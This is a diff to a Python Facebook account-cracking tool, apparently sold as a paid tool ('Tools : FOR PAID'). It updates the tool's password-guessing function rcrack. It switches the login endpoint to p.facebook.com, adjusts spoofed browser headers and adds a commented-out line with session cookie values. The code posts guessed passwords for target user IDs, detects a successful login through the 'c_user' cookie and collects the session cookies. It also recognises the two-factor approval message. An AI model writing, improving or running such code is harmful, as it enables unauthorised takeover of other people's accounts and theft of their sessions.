@@ -178,7 +178,7 @@ logo =("""
 ║[•] Whatsapp  : HIDE                    ║
 ║[•] Github    : Dx - Fahim              ║
 ║[•] Network   : 3G, 4G/5G, ON           ║
-║[•] Version   : 0.2                     ║
+║[•] Version   : 0.3                     ║
 ║[•] Tools     : FOR PAID                ║                 
 ╚════════════════════════════════════════╝""") 
  
@@ -275,14 +275,14 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'p.facebook.com',
             'method': 'GET',
             'path': '/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://www.google.com/',
+            # 'cookie': 'datr=q7CzZEh4aeBFiFSvabs-aHnD; sb=q7CzZDESRsIeGRG46P-ApqNq; m_pixel_ratio=1.7000000476837158; wd=424x828; fr=0RwWXZqok4kY2te8A..Bks7CI.cJ.AAA.0.0.Bks7De.AWWFZ_jSWc0',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
@@ -291,12 +291,12 @@ def rcrack(uid,pwx,tl):
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'cross-site',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
